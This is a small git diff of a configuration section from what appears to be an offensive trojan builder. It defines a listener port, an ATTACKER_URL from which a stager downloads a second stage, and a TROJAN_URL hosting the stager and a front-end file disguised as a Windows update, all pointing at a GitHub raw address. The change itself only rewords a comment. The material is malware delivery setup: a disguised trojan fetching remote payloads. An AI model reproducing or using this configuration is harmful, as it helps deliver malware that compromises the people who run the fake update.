@@ -56,7 +56,7 @@ LPORT        = "21"
 # Host from which stager (STAGERNAME) download second stage (SECONDNAME)
 ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
 
-# Host from which you download second stage (SECONDNAME) and front end file (e.g. windows update - TROJAN-FE)
+# Host from which trojan download stager (STAGERNAME) and front end file (e.g. windows update - TROJAN-FE)
 TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
 
 # File name
